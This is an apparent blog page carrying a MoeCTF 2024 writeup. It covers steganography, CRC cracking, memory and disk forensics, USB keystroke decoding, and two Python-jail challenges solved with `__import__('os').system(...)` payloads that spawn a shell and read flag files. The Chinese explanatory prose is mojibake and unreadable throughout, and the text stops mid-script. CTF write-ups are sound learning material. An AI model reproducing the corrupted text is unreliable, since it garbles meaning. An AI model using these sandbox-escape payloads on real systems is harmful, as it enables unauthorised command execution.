<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>MoeCTF 2024 Writeup | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="MoeCTF 2024 Writeup - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/moectf-2024-writeup/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/moectf-2024-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/moectf-2024-writeup/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="MoeCTF 2024 Writeup">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-10T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MoeCTF 2024 Writeup">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "https://z9nn8w.github.io/posts/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "MoeCTF 2024 Writeup",
      "item": "https://z9nn8w.github.io/posts/ctf/moectf-2024-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "MoeCTF 2024 Writeup",
  "name": "MoeCTF 2024 Writeup",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "æ‚é¡¹å…¥é—¨æŒ‡åŒ— æµ·æŠ¥å³ä¾§æœ‰ä¸€æ®µæ‘©æ–¯å¯†ç  moectf{H4VE_A_G00D_T1ME}\nsignin ç›´æ¥å…ˆç»™æ‰€æœ‰äººå…¨ç­¾ä¸ªåˆ°ï¼Œå†æŠŠluoæ”¹æˆç¼ºå‹¤å³å¯å®Œæˆä»»åŠ¡æ‹¿åˆ°flag\nmoectf{Thanks_For_You_signing_in_4ND_W3l0c0me_T0_M0ecTf_2024!!!}\nç½—å°é»‘æˆ˜è®° WPSå›¾ç‰‡å¯ä»¥ç›´æ¥é€å¸§çœ‹ï¼Œå…¶ä¸­æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç å‡ºflag\nmoectf{y0uu6r3th3m0st3r1nth1sf13ld}\nez_F5 F5ç®—æ³•åŠ å¯†çš„jpgå›¾ç‰‡ï¼Œwinhexæ‰“å¼€å°±èƒ½çœ‹åˆ°æœ‰ä¸€æ®µbase32ï¼Œè§£ç å†…å®¹å’Œbase32ä¹‹åçš„å†…å®¹ä¸€è‡´ï¼Œno_password\nå¯ä»¥ç›´æ¥ç”¨F5-steganographyä¸€æŠŠæ¢­ https://github.com/matthewgao/F5-steganography\nä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ²¡å¯†ç ï¼Œåæ¥å‘ç°å¯†ç å°±æ˜¯no_passwordï¼Œä¸è¿‡è¦æ³¨æ„javaç‰ˆæœ¬ä¸èƒ½å¤ªé«˜\njava Extract suantouwangba.jpg -p no_password å¯ä»¥åœ¨output.txtä¸­çœ‹åˆ°è§£å¯†çš„å†…å®¹ï¼šmoectf{F5_15_s0_lntere5t1n9}\næ‚ä½ä¸€åªè€³ daylightéŸ³é¢‘ç›´æ¥å¬èƒ½å¬åˆ°ä¸€ä¸²æ•°å­— 63 31 43 31 41 52 31 51 71 101\nçœ‹äº†æç¤ºï¼ŒçŸ¥é“æ•°å­—æ˜¯åªå’Œé”®ç›˜å­—æ¯æœ‰å…³çš„åæ ‡ï¼Œä¸€ä¸€å¯¹åº”èµ·æ¥ï¼Œæ³¨æ„å¼€å¤§å†™é”å®šcaps\nmoectf{NEVERGIVEUP}\nreadme /proc/pidç›®å½•ä¸­å­˜åœ¨å…³äºpidè¿›ç¨‹çš„ä¿¡æ¯ï¼Œé€šè¿‡æ–‡ä»¶æè¿°ç¬¦fdå³/proc/pid/fd/3å¯ä»¥è¯»å–æœªè¢«å…³é—­çš„æ–‡ä»¶å†…å®¹ï¼Œè‹¥æ˜¯å½“å‰è¿›ç¨‹ï¼Œåˆ™pidå¯ä»¥æ˜¯selfï¼Œæ•…é€šè¿‡/proc/self/fd/3å³å¯è¯»å–å½“å‰è¿›ç¨‹ä¸‹ç¬¬ä¸€ä¸ªæ‰“å¼€ä½†æœªå…³é—­çš„æ–‡ä»¶/tmp/therealflagä¸­çš„å†…å®¹ï¼Œå³ä½¿åŸæ–‡ä»¶è¢«åˆ é™¤äº†\nmoejail_lv1 å¯ä»¥ç›´æ¥æ‹¿shellï¼Œç„¶åæ‰¾æ‰¾flagåœ¨å“ªï¼Œå‘ç°è¢«éšè—/tmpç›®å½•ä¸‹ï¼Œflagæ–‡ä»¶åå­—å¾ˆé•¿å¯ä»¥ç”¨é€šé…ç¬¦*æ›¿ä»£\nGive me your payload:__import__('os').system(\"/bin/sh\") ls /tmp -al total 12 drwxrwxrwt 1 root root 4096 Aug 16 11:18 . drwxr-xr-x 1 root root 4096 Aug 16 11:18 .. -rw-r--r-- 1 1000 root 63 Aug 16 11:18 .therealflag_c7d07b4afdbfcc56e4a5c8066159380c85fe7bdb76da1ebad9f3622bba21f423ad5972ff2720a7b8f03903e883b49782afc9efa4d50144b1e0973cc6a421a6f4 - cat /tmp/.t* moectf{Ah_h4-NOw_YOU_Know_hoW_tO-3ScaPe_5ImPL3-STRINg_flLter0} ctfer2077â‘  å¦‚æœç›´æ¥æ‰«ç ä¼šå¾—åˆ°ä¸€ä¸²å†…å®¹ï¼Œæœ‰ä¸ªBVå·ï¼Œçœ‹äº†å°±ä¼šå‘ç°è¢«éª—äº†ï¼ˆ\nçœŸçš„flagå†…å®¹åœ¨lsbéšå†™é‡Œï¼Œzstegä¸€æŠŠæ¢­\nè§£ä¸å®Œçš„å‹ç¼©åŒ… 999.zipè„šæœ¬è§£ä¸€ä¸‹ï¼Œåˆ°æœ€åä¸€å±‚æœ‰ä¸ªcccccccrc.zipï¼Œå†ä»ç½‘ä¸Šæ‰¾ä¸€ä¸ªcrc32è„šæœ¬çˆ†ç ´ä¸€ä¸‹æ‹¿åˆ°å¯†ç pwdï¼Œè§£å‹ç¼©åŒ…æ‹¿flag\nimport zipfile import os save_path = \"./zip\" for i in range(999,0,-1): zip_path=\"./zip/{}.zip\".format(i) file=zipfile.ZipFile(zip_path) file.extractall(save_path) file.close() os.remove(\"./zip/{}.zip\".format(i)) import binascii import string def crack_crc(): print('-------------Start Crack CRC-------------') crc_list = [0xf812a17e, 0x43dfeaa4, 0xc617bdf4, 0x1db1c332]#æ–‡ä»¶çš„CRC32å€¼åˆ—è¡¨ï¼Œæ³¨æ„é¡ºåº comment = '' chars = string.printable for crc_value in crc_list: for char1 in chars: for char2 in chars: res_char = char1 + char2#è·å–éå†çš„ä»»æ„2Byteå­—ç¬¦ char_crc = binascii.crc32(res_char.encode())#è·å–éå†å­—ç¬¦çš„CRC32å€¼ calc_crc = char_crc \u0026 0xffffffff#å°†è·å–åˆ°çš„å­—ç¬¦çš„CRC32å€¼ä¸0xffffffffè¿›è¡Œä¸è¿ç®— if calc_crc == crc_value:#å°†è·å–å­—ç¬¦çš„CRC32å€¼ä¸æ¯ä¸ªæ–‡ä»¶çš„CRC32å€¼è¿›è¡ŒåŒ¹é… print('[+] {}: {}'.format(hex(crc_value),res_char)) comment += res_char print('-----------CRC Crack Completed-----------') print('Result: {}'.format(comment)) if __name__ == '__main__': crack_crc() moectf{af9c688e-e0b9-4900-879c-672b44c550ea}\nthe_secret_of_snowball jpgæ–‡ä»¶å¤´æœ‰é—®é¢˜ï¼Œæ”¹æˆFF D8ï¼Œå›¾ç‰‡æ­£å¸¸æ‰“å¼€å°±èƒ½çœ‹åˆ°å‰ä¸€æ®µflagäº†ï¼Œæ–‡ä»¶å°¾æœ‰ä¸€ä¸²base64ï¼Œç›´æ¥è§£æ‹¿åˆ°ååŠæ®µflag\nmoectf{Welc0me_t0_the_secret_life_0f_Misc!}\næ¯äººè‡³å°‘300ä»½ äºŒç»´ç ç¢ç‰‡å¾ˆå‹å¥½ï¼Œä»ä¸­é—´åˆ‡çš„ï¼Œè¿˜æ²¡æœ‰æ—‹è½¬ï¼ŒäºŒç»´ç å¯ä»¥ç›´æ¥æ‹¼å‡ºæ¥ï¼š\næ‰«æå¾—åˆ°ä¸€ä¸²ç¥å¿…å†…å®¹ï¼š\nbalabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}?? {}é‡Œçš„å†…å®¹è§£base58å¾—åˆ°we1rd_qrc0d3ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯key\nç›´æ¥è·‘å»è§£å¯†encode.txtäº†ï¼Œå…‰è§£å¯†è‹±æ–‡å­—ç¬¦éƒ¨åˆ†å°±å‘ç°ç«¯å€ªäº†ï¼Œä¸‰æ®µåˆ†åˆ«å¯¹åº”firstrowï¼Œsecondrowï¼Œthirdrowï¼Œä¸€å…±9ä¸ªæ•°å­—æƒ³ç€è‚¯å®šæ˜¯äºŒç»´ç ç¢ç‰‡çš„æ‹¼æ¥é¡ºåºäº†ï¼Œç›´æ¥æŠŠflagäº¤äº†ï¼Œä¹‹ååˆç ”ç©¶äº†ä¸€ä¸‹ï¼Œå†™äº†ä¸ªè§£å¯†è„šæœ¬\ndef self_decoding(output_text): code_setting_first = \"abcdefghijklmnopqrstuvwxyz\" output_text = output_text.split(\" \") decoded_text = \"\" for x in output_text: if x in code_setting_first: if ord(x) \u003e 116: num = ord(x) - 19 x = chr(num) decoded_text += x elif ord(x) \u003c 102 and ord(x) \u003e 96: num = ord(x) + 19 x = chr(num) decoded_text += x elif 104 \u003c= ord(x) \u003c= 115: num = 219 - ord(x) x = chr(num) decoded_text += x #æ˜æ–‡åŠ å¯†æ—¶å°¾éƒ¨æ•°å­—æ²¡å˜ï¼Œä»å°¾éƒ¨å¼€å§‹å¼‚æˆ–å›å» number_setting = \"0123456789\" n3 = output_text[-1] n2 = str(int(output_text[-2]) ^ int(n3)) n1 = str(int(output_text[-3]) ^ int(n2)) decoded_text += n1 + n2 + n3 return decoded_text def reverse_decoding(input_text): output_text = input_text[::-1] return output_text if __name__ == \"__main__\": encoded_text1 = \"7 3 5 d l i a h i r y\" encoded_text2 = \"6 5 1 d l i w m l v x h\" encoded_text3 = \"9 1 31 d l i w i r s a\" print(self_decoding(reverse_decoding(encoded_text1))) print(self_decoding(reverse_decoding(encoded_text2))) print(self_decoding(reverse_decoding(encoded_text3))) è¿è¡Œç»“æœï¼š\nfirstrow147 secondrow236 thirdrow589 moectf{we1rd_qrc0d3}\nThe upside and down æ‹¿åˆ°ä¸€ä¸ª.hexåç¼€çš„æ–‡ä»¶ï¼Œä½†æ˜¯å†…å®¹å’Œintel hexæ–‡ä»¶æ²¡å•¥å…³ç³»ï¼Œç»“åˆé¢˜ç›®åï¼Œè¯•ç€æŠŠæ¯ä¸ªå­—èŠ‚çš„hexå€¼å·¦å³ä¸¤ä½äº¤æ¢é¡ºåºï¼Œè¯•è¯•å‰å‡ ä¸ªå­—èŠ‚å°±èƒ½å‘ç°æ˜¯é€†ç½®çš„pngå°¾ï¼Œäºæ˜¯å°±æƒ³åˆ°æŠŠæ‰€æœ‰å­—èŠ‚éƒ½ååºï¼Œç„¶åå†é€†ç½®æ•´ä¸ªæ–‡ä»¶å³å¯ï¼Œ010Editorå’Œwinhexé‡Œéƒ½æ²¡æ‰¾åˆ°æ–¹ä¾¿ååºå­—èŠ‚çš„å·¥å…·ï¼Œç›´æ¥å†™è„šæœ¬äº†\nwith open(\"./the_upside_and_down.hex\",\"rb+\") as f: data = f.read() for i in range(len(data)): hex_num = hex(data[i]).replace(\"0x\",\"\").rjust(2,\"0\") hex_num_reverse = hex_num[::-1] reverse_byte = chr(int(hex_num_reverse,base=16)).encode(\"latin\") f.seek(i) f.write(reverse_byte) f.flush() with open(\"./the_upside_and_down.hex\",\"rb+\") as ff: new_data = ff.read() with open(\"flag.png\",\"wb+\") as fff: fff.write(new_data[::-1]) flag.pngæ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¯ä»¥å¾—åˆ°ï¼š\nwhere_is_the_flag? https://balabala_towards:moectf{Fri3nds_d0n't_lie!}// Find It ä¸€é“ç¤¾å·¥é¢˜ï¼Œè´´ä¸ªåŸå›¾å…ˆï¼š\nå›¾ç‰‡ä¸Šèƒ½çœ‹åˆ°æ¡”å­æ°´æ™¶é…’åº—å’Œç¾å±…é…’åº—ï¼Œå†ç»“åˆæç¤ºâ€œçš„â€è¿˜æ˜¯â€œçš„â€ï¼Œåœ°å›¾ä¸Šå¤šæœæœï¼Œèƒ½æ‰¾åˆ°å‰çš„å ¡å¹¼å„¿å›­\nmoectf{ji_di_bao_you_er_yuan}\nez_Forensics çœ‹çœ‹cmdè®°å½•å°±è¡Œ\npath\u003evolatility26.exe -f flag.raw --profile=Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: conhost.exe Pid: 2268 CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 3 LastAdded: 2 LastDisplayed: 2 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 @ 0x330410: echo moectf{WWBGY-TLVC5-XKYBZ} \u003e flag.txt Cmd #1 @ 0x30cec0: echo SJW7O^%gt8 \u003e flag.txt Cmd #2 @ 0x3350b0: del flag.txt ************************************************** CommandProcess: conhost.exe Pid: 904 CommandHistory: 0x19b0a0 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 ctfer2077â‘¡ volumeæ˜¯åŠ å¯†æŒ‚è½½å·ï¼Œå¯†ç æ˜¯é¢˜ç›®æè¿°é‡Œçš„æ ¸å¿ƒä»·å€¼è§‚è§£å¯†å†…å®¹ï¼š\næ³•æ²»å¯Œå¼ºè‡ªç”±å¯Œå¼ºå’Œè°å¹³ç­‰å’Œè°å¹³ç­‰æ³•æ²»æ³•æ²»å’Œè°å¯Œå¼ºæ³•æ²»æ–‡æ˜å…¬æ­£è‡ªç”± p@55w0rd VeraCryptæˆåŠŸæŒ‚è½½åèƒ½æ‹¿åˆ°ä¸€ä¸ªflag.txtï¼Œä½†æ˜¯é‡Œé¢æ²¡å†…å®¹ï¼Œè€ƒè™‘åˆ°æ˜¯ä¸ªç£ç›˜ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯NTFSæ•°æ®æµéšå†™ï¼š\nA:\\\u003edir /r é©±åŠ¨å™¨ A ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚ å·çš„åºåˆ—å·æ˜¯ F61A-E148 A:\\ çš„ç›®å½• 2024/07/28 20:54 18 flagï¼Ÿ.txt 82 flagï¼Ÿ.txt:å°é¹¤.txt:$DATA 1 ä¸ªæ–‡ä»¶ 18 å­—èŠ‚ 0 ä¸ªç›®å½• 1,064,960 å¯ç”¨å­—èŠ‚ notepadæ‰“å¼€ï¼š\nA:\\\u003enotepad flagï¼Ÿ.txt:å°é¹¤.txt ulpb vfde hfyz yisi buuima key jqui xxmm vedrhx de qrpb xnxp ulpb ui veyh dazide ç»“åˆæ–‡ä»¶åå°é¹¤ï¼Œæ‰¾åˆ°ä¸ªå°é¹¤åŒæ‹¼è¾“å…¥æ³•ï¼Œç…§ç€æ‰“å°±èƒ½çŸ¥é“å¤§æ¦‚å†…å®¹äº†ï¼š\nåŒå“ çœŸå¾— å¾ˆæœ‰ æ„æ€ ä¸æ˜¯å— key å°±æ˜¯ ä¸‹é¢ æŠ˜æ–­è¯ å¾— å…¨å“ ç¬‘äº› åŒæ‹¼ äº‹ ç€æ · æ‰“å­—å¾— flagæ˜¯ä¸Šé¢è¿™æ®µè¯çš„å…¨æ‹¼å°å†™ï¼š\nmoectf{shuangpinshizheyangdazide}\næ‹¼å›¾ç¾”æ‰‹ ç›´æ¥æ‹¼äºŒç»´ç ç¢ç‰‡æ‹¿åˆ°åŠ å¯†çš„flagï¼š\nbalabalbalablbalblablbalabala//nihaopintugaoshou//encoded_flag{71517ysd%ryxsc!usv@ucy*wqosy*qxl\u0026sxl*sbys^wb$syqwp$ysyw!qpw@hs} æ ¹æ® encode.py å†™å‡º decode.py æ‹¿åˆ°keyå’Œè§£å¯†åçš„flagï¼š\nfrom base64 import b64decode as bd def self_decoding(input_text): code_setting_first = \"abcdefghijklmnopqrstuvwxyz\" code_setting_sec = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" number_setting = \"0123456789\" decoded_text= \"\" for x in input_text: if x in code_setting_first: if ord(x) \u003c 123 and ord(x) \u003e 115: num = ord(x) - 19 elif ord(x) \u003e 96 and ord(x) \u003c 104: num = ord(x) + 19 elif 104 \u003c= ord(x) \u003c= 115: num = 219 - ord(x) decoded_text += chr(num) elif x in code_setting_sec: if 64 \u003c ord(x) \u003c 72: num = ord(x) + 7 elif 71 \u003c ord(x) \u003c 79: num = ord (x) - 7 elif 78 \u003c ord(x) \u003c 82: num = ord(x) + 9 elif 87 \u003c ord(x) \u003c 91: num = ord(x) - 9 elif 81 \u003c ord(x) \u003c 88: num = 168 - ord(x) decoded_text += chr(num) else: decoded_text += x if decoded_text[-1] not in number_setting: return decoded_text decoded_text = list(decoded_text) tmp = \"7\" for i in range(len(input_text)-2,len(input_text)-6,-1): decoded_text[i] = str(int(input_text[i]) ^ int(tmp)) tmp = decoded_text[i] return \"\".join(decoded_text) def reverse_decoding(input_text): output_text = input_text[::-1] return output_text def strange_character_hint(key): key = reverse_decoding(self_decoding(key)) return key if __name__==\"__main__\": cipherkey = b'eGl4c2R4bmxVbVhpeHVuYkdzYXJkZnRhVWl4YXZ0aXRzSnh6bXRpYVU=' print(strange_character_hint(bd(cipherkey).decode())) ciphertext = r\"71517ysd%ryxsc!usv@ucy*wqosy*qxl\u0026sxl*sbys^wb$syqwp$ysyw!qpw@hs\" print(self_decoding(reverse_decoding(ciphertext))) è¿è¡Œç»“æœï¼š\nStrangeCharacterStaywithNumberOnSomewhere hs@dkj!dfhf$kdjfh$ud^hfuh*oeh\u0026oej*fhljd*fvb@chb!vhefi%whf52367 hintçš„æ„æ€å¯èƒ½æ˜¯è¯´flagä¸­@è¿™ç§å­—ç¬¦åº”è¯¥å¯¹åº”é”®ç›˜ä¸Šçš„æ•°å­—ï¼š\nhs2dkj1dfhf4kdjfh4ud6hfuh8oeh7oej8fhljd8fvb2chb1vhefi5whf52367 å”‰ï¼Œå¯¹ç€è¿™ä¸²å­—ç¬¦æƒ³äº†å¥½ä¹…å¥½ä¹…å¥½ä¹…ï¼Œæœ€åå‘ç°flagæ˜¯è¿™æ®µä¸œè¥¿åŒ…ä¸Šmoectf{}\nmoejail_lv2 æ„Ÿè§‰å’Œlv1æ²¡å•¥åŒºåˆ«ï¼Œè¯´æ˜¯è¿‡æ»¤äº†å­—ç¬¦ï¼Œç›´æ¥cat flagæ–‡ä»¶äº†ä¹Ÿæ²¡æµ‹ï¼ˆ\nGive me your code: __import__('os').system('ls -al /tmp') total 12 drwxrwxrwt 1 root root 4096 Aug 26 11:11 . drwxr-xr-x 1 root root 4096 Aug 26 11:11 .. -rw-r--r-- 1 root root 57 Aug 26 11:11 therealflag_35173e1253a15fb3d5d15efdc930eb8e Nope é¦ƒãˆ Are you robot? Please enter 'FMMG8H'+'F9BUG2'=? to continue: FMMG8HF9BUG2 Give me your code: __import__('os').system('cat /tmp/therealflag_35*') moectf{yOu-caN-BYPa5S-THe_Str1NG_fIITEr-6Y_NUm_t0-ChR30} æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š æ–‡ä»¶å°¾æœ‰ä¸ªç½‘å€ï¼Œæ‰“å¼€åˆ†ç¦»å›¾å±‚ï¼Œé»‘çš„é‚£å±‚å›¾ç‰‡å¯¼å‡ºåï¼Œstegsolveé‡Œç¿»ç¿»å¯ä»¥çœ‹åˆ° key=p_w_d\nç”¨è¿™ä¸ªkeyè§£å‹ç¼©åŒ…ï¼Œä¹‹åè§£å‡¯æ’’å°±è¡Œ\nzbrpgs{q751894o-rr0n-47qq-85q4-r92q0443921s} moectf{d751894b-ee0a-47dd-85d4-e92d0443921f} æ—¶å…‰ç©¿æ¢­æœº 1946å¹´4æœˆ20æ—¥çš„ä¼¦æ•¦ + å½“åœ°çŸ¥åçš„ç”»æŠ¥ ==\u003e Illustrated London Newsï¼š\nåœ¨è¿™ä¸ªnewsé‡Œé¢ç­›é€‰æ—¶é—´ 1946/4/20 + tomb ï¼Œèƒ½æ‰¾åˆ°ä¸€ç¯‡é‡åˆåº¦æé«˜çš„ç”»æŠ¥ï¼š\nhttps://www.britishnewspaperarchive.co.uk/viewer/bl/0001578/19460420/043/0015\nè¯»è¯»èƒ½çŸ¥é“æ˜¯ç‹å»ºå¢“ï¼Œç™¾åº¦ç™¾ç§‘é‡Œä¿¡æ¯åŸºæœ¬å’Œç”»æŠ¥ç¬¦åˆï¼Œé«˜å¾·åœ°å›¾çœ‹çœ‹å°±æ‰¾åˆ°ä¸­åŒ»é¦†äº†ï¼š\nmoectf{han_fang_tang}\nctfer2077â‘¢ æµé‡é‡Œhttpåè®®ä¼ äº†ä¸ªzipï¼Œå¯¼å‡ºè§£å‹æ‹¿åˆ°ä¸€ä¸ªgifï¼Œä¸€ä¸ªzipï¼Œä¸€ä¸ªmp3ï¼Œgifæœ‰ä¸€å¸§é‡Œèƒ½çœ‹åˆ°keyï¼š\nmp3å¬å¬æ²¡å•¥é—®é¢˜ï¼Œç›´æ¥è¯•è¯•MP3stegoï¼Œè§£å‡ºä¸ªbrainfuckï¼š\n+++++ +++[- \u003e++++ ++++\u003c ]\u003e+++ +++++ .\u003c+++ +[-\u003e- ---\u003c] \u003e---. \u003c++++ +++[- \u003e++++ +++\u003c] \u003e+.\u003c+ ++++[ -\u003e--- --\u003c]\u003e ----- -.\u003c++ +[-\u003e+ ++\u003c]\u003e +++++ +.\u003c++ +[-\u003e- --\u003c]\u003e -.\u003c++ ++[-\u003e ----\u003c ]\u003e--- -.\u003c++ ++++[ -\u003e+++ +++\u003c] \u003e++++ +.\u003c è§£å‡ºæ¥æ–°çš„keyï¼š\nH5gHWM9b æ‹¿å»è§£å‹zipï¼Œé‡Œé¢ä¸‰æ®µflagï¼Œæ˜¯ç¦å°”æ‘©æ–¯é‡Œè·³èˆçš„å°äººå¯†ç ï¼Œä¸è¿‡æ„Ÿè§‰ç”»çš„ä¸æ˜¯å¾ˆè§„èŒƒï¼Œé‚£ä¸ªPå­—æ¯å®Œå…¨æ˜¯çŒœå‡ºæ¥çš„ï¼Œæœ€åçŒœå‡ºflagï¼Œè¿™æ˜¯å…¶ä¸­ä¸€æ®µï¼š\nmoectf{PEOPLE_DANCING_HAPPILY}\nez_usbpcap usbæµé‡ï¼Œç”¨tsharkæå–å‡ºé”®ç›˜çš„ usbhid data ï¼š\ntshark -r flag.pcapng -T fields -Y \"usb.src==2.1.1\" -e usbhid.data \u003e usb.txt æå–å‡ºçš„ usb.txt å†…å®¹ï¼Œï¼š\n00005e0000000000 0000000000000000 0000070000000000 0000000000000000 00005e0000000000 0000000000000000 0000090000000000 0000000000000000 00005e0000000000 0000000000000000 00005d0000000000 0000000000000000 00005e0000000000 0000000000000000 00005b0000000000 0000000000000000 00005f0000000000 0000000000000000 00005c0000000000 0000000000000000 00005e0000000000 0000000000000000 00005e0000000000 0000000000000000 00005f0000000000 0000000000000000 0000050000000000 0000000000000000 00005e0000000000 0000000000000000 0000080000000000 0000000000000000 00005b0000000000 0000000000000000 0000590000000000 0000000000000000 00005e0000000000 0000000000000000 0000600000000000 0000000000000000 00005e0000000000 0000000000000000 0000590000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 00005f0000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 0000610000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 00005d0000000000 0000000000000000 00005e0000000000 0000000000000000 00005c0000000000 0000000000000000 00005e0000000000 0000000000000000 0000610000000000 0000000000000000 00005e0000000000 0000000000000000 0000590000000000 0000000000000000 00005e0000000000 0000000000000000 0000080000000000 0000000000000000 00005e0000000000 0000000000000000 0000060000000000 0000000000000000 00005b0000000000 0000000000000000 00005b0000000000 0000000000000000 00005b0000000000 0000000000000000 00005a0000000000 0000000000000000 00005b0000000000 0000000000000000 00005c0000000000 0000000000000000 00005b0000000000 0000000000000000 00005d0000000000 0000000000000000 00005b0000000000 0000000000000000 0000590000000000 0000000000000000 00005f0000000000 0000000000000000 0000070000000000 0000000000000000 å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€äº›ä¸å¸¸è§çš„dataå€¼ï¼Œæ¯”å¦‚5eï¼Œè‡ªå·±ä»ç è¡¨é‡Œæ‰¾å‡ºå¯¹åº”é”®ç›˜æŒ‰é”®å†è¡¥åˆ°è„šæœ¬é‡Œå»å³å¯ï¼š\nnormalKeys = {\"04\": \"a\", \"05\": \"b\", \"06\": \"c\", \"07\": \"d\", \"08\": \"e\", \"09\": \"f\", \"0a\": \"g\", \"0b\": \"h\", \"0c\": \"i\", \"0d\": \"j\", \"0e\": \"k\", \"0f\": \"l\", \"10\": \"m\", \"11\": \"n\", \"12\": \"o\", \"13\": \"p\", \"14\": \"q\", \"15\": \"r\", \"16\": \"s\", \"17\": \"t\", \"18\": \"u\", \"19\": \"v\", \"1a\": \"w\", \"1b\": \"x\", \"1c\": \"y\", \"1d\": \"z\", \"1e\": \"1\", \"1f\": \"2\", \"20\": \"3\", \"21\": \"4\", \"22\": \"5\", \"23\": \"6\", \"24\": \"7\", \"25\": \"8\", \"26\": \"9\", \"27\": \"0\", \"28\": \"\", \"29\": \"\", \"2a\": \"\", \"2b\": \"\\t\", \"2c\": \"\", \"2d\": \"-\", \"2e\": \"=\", \"2f\": \"[\", \"30\": \"]\", \"31\": \"\\\\\", \"32\": \"\", \"33\": \";\", \"34\": \"'\", \"35\": \"\", \"36\": \",\", \"37\": \".\", \"38\": \"/\", \"39\": \"\", \"3a\": \"\", \"3b\": \"\", \"3c\": \"\", \"3d\": \"\", \"3e\": \"\", \"3f\": \"\", \"40\": \"\", \"41\": \"\", \"42\": \"\", \"43\": \"\", \"44\": \"\", \"45\": \"\", \"59\": \"1\", \"5a\": \"2\", \"5b\": \"3\", \"5c\": \"4\", \"5d\": \"5\", \"5e\": \"6\", \"5f\": \"7\", \"60\": \"8\", \"61\": \"9\", \"62\": \"0\"} shiftKeys = {\"04\": \"A\", \"05\": \"B\", \"06\": \"C\", \"07\": \"D\", \"08\": \"E\", \"09\": \"F\", \"0a\": \"G\", \"0b\": \"H\", \"0c\": \"I\", \"0d\": \"J\", \"0e\": \"K\", \"0f\": \"L\", \"10\": \"M\", \"11\": \"N\", \"12\": \"O\", \"13\": \"P\", \"14\": \"Q\", \"15\": \"R\", \"16\": \"S\", \"17\": \"T\", \"18\": \"U\", \"19\": \"V\", \"1a\": \"W\", \"1b\": \"X\", \"1c\": \"Y\", \"1d\": \"Z\", \"1e\": \"!\", \"1f\": \"@\", \"20\": \"#\", \"21\": \"$\", \"22\": \"%\", \"23\": \"^\", \"24\": \"\u0026\", \"25\": \"*\", \"26\": \"(\", \"27\": \")\", \"28\": \"\", \"29\": \"\", \"2a\": \"\", \"2b\": \"\\t\", \"2c\": \"\", \"2d\": \"_\", \"2e\": \"+\", \"2f\": \"{\", \"30\": \"}\", \"31\": \"|\", \"32\": \"\", \"33\": \"\\\"\", \"34\": \":\", \"35\": \"~\", \"36\": \"\u003c\", \"37\": \"\u003e\", \"38\": 